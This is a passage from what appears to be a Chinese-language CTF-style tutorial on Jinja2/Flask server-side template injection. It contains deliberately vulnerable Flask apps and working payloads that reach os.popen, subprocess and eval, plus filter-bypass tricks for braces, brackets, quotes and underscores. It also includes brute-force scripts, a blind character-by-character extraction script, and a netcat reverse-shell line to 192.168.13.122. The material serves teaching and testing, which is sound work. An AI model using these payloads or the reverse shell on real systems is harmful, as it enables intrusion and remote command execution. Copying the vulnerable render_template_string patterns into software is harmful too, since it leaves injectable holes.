class="string">&quot;&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[&quot;</span></span><br><span class="line">        + <span class="built_in">str</span>(i)</span><br><span class="line">        + <span class="string">&quot;].__init__.__globals__&#125;&#125;&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    response = requests.get(url, params=data)</span><br><span class="line">    <span class="comment"># response = requests.post(url, params=data)</span></span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;linecache&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(i)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>具体利用payload如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[索引].__init__.__globals__.linecache.os.popen(<span class="string">&quot;whoami&quot;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="subprocess命令执行"><a href="#subprocess命令执行" class="headerlink" title="subprocess命令执行"></a>subprocess命令执行</h2><p>从python2.4开始，就可以使用<code>subprocess</code>这个模块来产生子进程，并连接到子进程的标准输入&#x2F;输出&#x2F;错误中去，还可以得到子进程的返回值。他的产生似乎是为了替代其他几个老模块和函数产生的，比如<code>os.system</code>、<code>os.popen</code>等函数。他的查找方式可以直接参考简单利用的方式，模块名字是<code>subprocess.Popen</code>，利用payload如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">541</span>](<span class="string">&#x27;whoami&#x27;</span>,shell=<span class="literal">True</span>,stdout=-<span class="number">1</span>).communicate()[<span class="number">0</span>].strip()&#125;&#125;</span><br></pre></td></tr></table></figure><h1 id="双括弧绕过"><a href="#双括弧绕过" class="headerlink" title="双括弧绕过"></a>双括弧绕过</h1><p>有些题目可能会把<code>&#123;&#123;`和`&#125;&#125;</code>过滤，或者是通过正则的形式给这俩过滤掉，题目代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">filter_ssti</span>(<span class="params">input_str</span>):</span><br><span class="line">    <span class="keyword">if</span> input_str <span class="keyword">and</span> (<span class="string">&quot;&#123;&#123;&quot;</span> <span class="keyword">in</span> input_str <span class="keyword">or</span> <span class="string">&quot;&#125;&#125;&quot;</span> <span class="keyword">in</span> input_str):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hack!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> input_str</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    raw_str = request.args.get(<span class="string">&quot;str&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    filtered_str = filter_ssti(raw_str)</span><br><span class="line">    <span class="keyword">if</span> filtered_str == <span class="string">&quot;hack!&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> filtered_str, <span class="number">400</span></span><br><span class="line">    html_str = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;html&gt;</span></span><br><span class="line"><span class="string">        &lt;head&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string">        &lt;body&gt;&#123;0&#125;&lt;/body&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">        filtered_str</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> render_template_string(html_str)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>这里只要存在<code>&#123;&#123;`和`&#125;&#125;</code>输入都会触发hack，这里我们需要学习一下<code>jinja2</code>的逻辑渲染，具体的源码可以参考下面模板</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot; /&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot; /&gt;</span><br><span class="line">    &lt;title&gt;SSTI&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">      .red &#123;</span><br><span class="line">        color: red;</span><br><span class="line">      &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;ul&gt;</span><br><span class="line">      &#123;% for girl in girls %&#125; &#123;%if girl | length &gt;= 3 %&#125;</span><br><span class="line">      &lt;li class=&quot;red&quot;&gt;&#123;&#123; girl &#125;&#125;&lt;/li&gt;</span><br><span class="line">      &#123;% else %&#125;</span><br><span class="line">      &lt;li&gt;&#123;&#123; girl &#125;&#125;&lt;/li&gt;</span><br><span class="line">      &#123;% endif %&#125; &#123;% endfor %&#125;</span><br><span class="line">    &lt;/ul&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>然后用下面python代码去渲染他</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show1</span>():</span><br><span class="line">    girls = [<span class="string">&quot;小丽&quot;</span>, <span class="string">&quot;王小丽&quot;</span>, <span class="string">&quot;小红&quot;</span>, <span class="string">&quot;王小红&quot;</span>, <span class="string">&quot;小美&quot;</span>, <span class="string">&quot;小芳&quot;</span>]</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;luoji.html&quot;</span>, girls=girls)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>返回如下<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250628183423.png"><br>上面是一个简单的使用，如果要利用到刚才的题目中可以尝试一个这样的payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="keyword">if</span> <span class="number">2</span>&gt;<span class="number">1</span>%&#125;Test&#123;%endif%&#125;</span><br></pre></td></tr></table></figure><p>这里会直接显示Test，这里我们就可以尝试一下盲注的思路，回显的方法后面会说，大致思路可以参考下面payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">if</span> <span class="string">&#x27;&#x27;</span>.__class__ %&#125; Test &#123;% endif %&#125;</span><br></pre></td></tr></table></figure><p>如果Test返回了，那么就说明<code>&#39;&#39;.__class__</code>存在数据，那么我们可以直接尝试下面脚本进行爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:5000/&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;str&quot;</span>: <span class="string">&quot;&#123;% if &#x27;&#x27;.__class__.__base__.__subclasses__()[&quot;</span></span><br><span class="line">        + <span class="built_in">str</span>(i)</span><br><span class="line">        + <span class="string">&quot;].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](\&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()\&quot;) %&#125;Test&#123;%endif%&#125;&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    response = requests.get(url, params=data)</span><br><span class="line">    <span class="comment"># response = requests.post(url, params=data)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;Test&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">        <span class="built_in">print</span>(data)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>如果有回显，那么说明执行成功，我这里回显</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&#x27;str&#x27;</span>: <span class="string">&#x27;&#123;% if \&#x27;\&#x27;.__class__.__base__.__subclasses__()[104].__init__.__globals__[\&#x27;__builtins__\&#x27;][\&#x27;eval\&#x27;](&quot;__import__(\&#x27;os\&#x27;).popen(\&#x27;dir\&#x27;).read()&quot;) %&#125;Test&#123;%endif%&#125;&#x27;</span>&#125;</span><br></pre></td></tr></table></figure><p>提取出的payload如下，尝试之后会发现返回Test</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if &#x27;&#x27;.__class__.__base__.__subclasses__()[104].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;) %&#125;Test&#123;%endif%&#125;</span><br></pre></td></tr></table></figure><p>这个时候可以通过下面payload进行回显数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% print(&#x27;&#x27;.__class__.__base__.__subclasses__()[104].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;)) %&#125;</span><br></pre></td></tr></table></figure><p>结果如下<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250628184905.png"></p><h1 id="无回显绕过"><a href="#无回显绕过" class="headerlink" title="无回显绕过"></a>无回显绕过</h1><p>无回显绕过题目如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">template</span>():</span><br><span class="line">    template = request.args.get(<span class="string">&quot;str&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> template:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ERROR&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = render_template_string(template)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ERROR&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>一般这种题目三个思路，反弹shell、外带注入(dnslog)、盲注爆破(需要依赖回显)，思路其实都是依赖爆破的形式，例如下面反弹shell的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://127.0.0.1:5000&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">500</span>):</span><br><span class="line">    data = &#123;<span class="string">&#x27;code&#x27;</span>: <span class="string">&#x27;&#123;&#123;&quot;&quot;.__class__.__base__.__subclasses__()[&#x27;</span> + <span class="built_in">str</span>(i) + <span class="string">&#x27;].__init__.__globals__[&quot;popen&quot;](&quot;netcat 192.168.13.122 7788 -e /bin/bash&quot;).read() &#125;&#125;&#x27;</span>&#125;</span><br><span class="line">    <span class="keyword">try</span>:                                                                           </span><br><span class="line">        res = requests.post(url, data=data)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>直接爆破的可以参考双括弧绕过的那个脚本，需要简单修改，根据回显或者时间判断是否对。思路也可以参考sql注入的盲注爆破。例如下面爆破的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:5000/&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">payload</span>):</span><br><span class="line">    data = &#123;<span class="string">&quot;str&quot;</span>: payload&#125;</span><br><span class="line">    response = requests.get(url, params=data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;True&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">        payload = <span class="string">f&quot;&#123;&#123;&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;whoami&#x27;).read()[<span class="subst">&#123;i&#125;</span>:<span class="subst">&#123;i+<span class="number">1</span>&#125;</span>]==&#x27;<span class="subst">&#123;<span class="built_in">chr</span>(c)&#125;</span>&#x27;&#125;&#125;&#125;&#125;&quot;</span></span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        <span class="keyword">if</span> check(payload):</span><br><span class="line">            flag += <span class="built_in">chr</span>(c)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Current flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>可以根据情况自行修改脚本。<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250630210758.png"></p><h1 id="中括号过滤绕过"><a href="#中括号过滤绕过" class="headerlink" title="中括号过滤绕过"></a>中括号过滤绕过</h1><p>getitem是python的一个魔术方法，和之前获取父类的拿一些内容都是一回事，然后getitem的作用是对字典使用时，传入字符串，返回自带你响应键所对应的值，当对列表使用时，传入整数返回列表对应索引值。简单的示例如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">test</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.a = &#123;<span class="string">&quot;1&quot;</span>: <span class="string">&quot;大壮&quot;</span>, <span class="string">&quot;2&quot;</span>: <span class="string">&quot;小明&quot;</span>, <span class="string">&quot;3&quot;</span>: <span class="string">&quot;小红&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getitem__</span>(<span class="params">self, key</span>):</span><br><span class="line">        b = <span class="variable language_">self</span>.a[key]</span><br><span class="line">        <span class="keyword">return</span> b</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">t = test()</span><br><span class="line"><span class="built_in">print</span>(t[<span class="string">&quot;2&quot;</span>])</span><br></pre></td></tr></table></figure><p>下面在看一道例题，就是不允许使用中括号，代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">filter_ssti</span>(<span class="params">input_str</span>):</span><br><span class="line">    <span class="keyword">if</span> input_str <span class="keyword">and</span> (<span class="string">&quot;[&quot;</span> <span class="keyword">in</span> input_str <span class="keyword">or</span> <span class="string">&quot;]&quot;</span> <span class="keyword">in</span> input_str):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hack!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> input_str</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    raw_str = request.args.get(<span class="string">&quot;str&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    filtered_str = filter_ssti(raw_str)</span><br><span class="line">    <span class="keyword">if</span> filtered_str == <span class="string">&quot;hack!&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> filtered_str, <span class="number">400</span></span><br><span class="line">    html_str = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;html&gt;</span></span><br><span class="line"><span class="string">        &lt;head&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string">        &lt;body&gt;&#123;0&#125;&lt;/body&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">        filtered_str</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> render_template_string(html_str)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>下面用这个payload会发现出现问题(<code>os._wrap_close办法</code>)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span>=&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">147</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><p>出问题的位置是在使用<code>[147]</code>这个索引的地方，这个时候就可以通过<code>__getitem__</code>进行绕过，payload可以修改成下面这样</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span>=&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__().__getitem__(<span class="number">147</span>).__init__.__globals__.__getitem__(<span class="string">&#x27;__builtins__&#x27;</span>).__getitem__(<span class="string">&#x27;eval&#x27;</span>)(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><p>就可以直接运行了<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250630213236.png"></p><h1 id="单双引号过滤绕过"><a href="#单双引号过滤绕过" class="headerlink" title="单双引号过滤绕过"></a>单双引号过滤绕过</h1><p>简单看一道例题，代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">filter_ssti</span>(<span class="params">input_str</span>):</span><br><span class="line">    <span class="keyword">if</span> input_str <span class="keyword">and</span> (<span class="string">&quot;&#x27;&quot;</span> <span class="keyword">in</span> input_str <span class="keyword">or</span> <span class="string">&#x27;&quot;&#x27;</span> <span class="keyword">in</span> input_str):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hack!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> input_str</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    raw_str = request.args.get(<span class="string">&quot;str&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    filtered_str = filter_ssti(raw_str)</span><br><span class="line">    <span class="keyword">if</span> filtered_str == <span class="string">&quot;hack!&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> filtered_str, <span class="number">400</span></span><br><span class="line">    html_str = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;html&gt;</span></span><br><span class="line"><span class="string">        &lt;head&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string">        &lt;body&gt;&#123;0&#125;&lt;/body&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">        filtered_str</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> render_template_string(html_str)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这道题目不允许使用单引号和双引号，这种就无法直接通过一个参数进行传参，这种的解决方案就是从外部再次传参，需要传参的位置通过额外的其他方法进行传参，例如使用flask自带的request这个对象来获取其他各种形式的传参，具体比较常用的如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">request.args.key  <span class="comment"># 获取get传入的key值</span></span><br><span class="line">request.values.x1 <span class="comment"># 所有参数</span></span><br><span class="line">request.cookies   <span class="comment"># 获取cookies传入的值</span></span><br><span class="line">request.headers   <span class="comment"># 获取请求头参数</span></span><br><span class="line">request.<span class="keyword">from</span>.key  <span class="comment"># 获取post传入的参数(type需要等于form的数据)</span></span><br><span class="line">request.data      <span class="comment"># 获取post传入的参数(type需要等于其他的)</span></span><br><span class="line">request.json      <span class="comment"># 获取post传入的json参数(type需要等于json)</span></span><br></pre></td></tr></table></figure><p>下面简单利用get传参的形式进行绕过，原本的payload如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span>=&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__().__getitem__(<span class="number">147</span>).__init__.__globals__.__getitem__(<span class="string">&#x27;__builtins__&#x27;</span>).__getitem__(<span class="string">&#x27;eval&#x27;</span>)(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><p>采用get传参绕过的形式如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span>=&#123;&#123;().__class__.__base__.__subclasses__().__getitem__(<span class="number">147</span>).__init__.__globals__.__getitem__(request.args.a).__getitem__(request.args.b)(request.args.c)&#125;&#125;&amp;a=__builtins__&amp;b=<span class="built_in">eval</span>&amp;c=<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;dir&#x27;</span>).read()</span><br></pre></td></tr></table></figure><h1 id="下划线过滤绕过"><a href="#下划线过滤绕过" class="headerlink" title="下划线过滤绕过"></a>下划线过滤绕过</h1><p>在flask的模板渲染的时候有很多的过滤器，这些先列举一下，然后后面给一个案例使用一下，常用过滤器如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">length()  <span class="comment"># 获取一个序列或者自带你的长度，并返回值</span></span><br><span class="line"><span class="built_in">int</span>()     <span class="comment"># 将值转换为int类型</span></span><br><span class="line"><span class="built_in">float</span>()   <span class="comment"># 